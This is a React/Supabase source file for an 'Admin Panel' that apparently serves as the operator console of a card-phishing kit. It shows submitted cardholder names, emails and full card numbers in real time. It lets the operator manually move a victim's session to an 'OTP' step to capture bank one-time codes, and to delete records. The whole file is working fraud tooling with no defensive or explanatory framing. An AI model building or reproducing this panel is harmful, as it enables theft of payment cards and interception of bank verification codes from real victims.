import { useState, useEffect } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { ArrowRight, Clock, CheckCircle2, CreditCard, Trash2 } from "lucide-react";

interface Session {
  id: string;
  status: string;
  form_data: any;
  created_at: string;
}

const Admin = () => {
  const [sessions, setSessions] = useState<Session[]>([]);

  const fetchSessions = async () => {
    const { data } = await supabase
      .from("sessions")
      .select("*")
      .order("created_at", { ascending: false })
      .limit(50);
    if (data) setSessions(data as any);
  };

  useEffect(() => {
    fetchSessions();

    const channel = supabase
      .channel("admin-sessions")
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "sessions" },
        () => fetchSessions()
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, []);

  const updateStatus = async (id: string, status: string) => {
    await supabase.from("sessions").update({ status: status as any }).eq("id", id);
  };

  const deleteSession = async (id: string) => {
    await supabase.from("sessions").delete().eq("id", id);
    fetchSessions();
  };

  const statusIcon = (status: string) => {
    switch (status) {
      case "pending": return <Clock className="h-4 w-4 text-destructive" />;
      case "otp": return <ArrowRight className="h-4 w-4 text-primary" />;
      case "success": return <CheckCircle2 className="h-4 w-4 text-success" />;
      default: return null;
    }
  };

  return (
    <div className="min-h-screen bg-background p-6">
      <div className="max-w-4xl mx-auto space-y-6">
        <div className="flex items-center justify-between">
          <div>
            <h1 className="text-2xl font-bold text-foreground">Admin Panel</h1>
            <p className="text-sm text-muted-foreground mt-1">Control payment flow redirects</p>
          </div>
          <Button variant="outline" size="sm" onClick={fetchSessions}>
            Refresh
          </Button>
        </div>

        {sessions.length === 0 ? (
          <div className="glass-card rounded-2xl p-12 text-center">
            <CreditCard className="h-10 w-10 text-muted-foreground mx-auto mb-3" />
            <p className="text-muted-foreground">No sessions yet. Waiting for submissions...</p>
          </div>
        ) : (
          <div className="space-y-3">
            {sessions.map((session) => (
              <div key={session.id} className="glass-card rounded-xl p-5">
                <div className="flex items-center justify-between gap-4">
                  <div className="flex items-center gap-3 min-w-0">
                    {statusIcon(session.status)}
                    <div className="min-w-0">
                      <div className="flex items-center gap-2">
                        <span className="text-sm font-semibold text-foreground truncate">
                          {session.form_data?.cardholderName || "Unknown"}
                        </span>
                        <span className="text-xs px-2 py-0.5 rounded-full bg-secondary text-muted-foreground uppercase font-medium">
                          {session.status}
                        </span>
                      </div>
                      <p className="text-xs text-muted-foreground mt-0.5">
                        {session.form_data?.email} · {session.form_data?.cardNumber} · {new Date(session.created_at).toLocaleString()}
                      </p>
                    </div>
                  </div>

                  <div className="flex items-center gap-2 shrink-0">
                    {session.status === "pending" && (
                      <Button
                        size="sm"
                        onClick={() => updateStatus(session.id, "otp")}
                        className="bg-primary hover:bg-primary/90 shadow-sm"
                      >
                        <ArrowRight className="h-3.5 w-3.5 mr-1" />
                        Send to OTP
                      </Button>
                    )}
                    <Button
                      size="sm"
                      variant="ghost"
                      onClick={() => deleteSession(session.id)}
                      className="text-muted-foreground hover:text-destructive"
                    >
                      <Trash2 className="h-3.5 w-3.5" />
                    </Button>
                  </div>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
};

export default Admin;
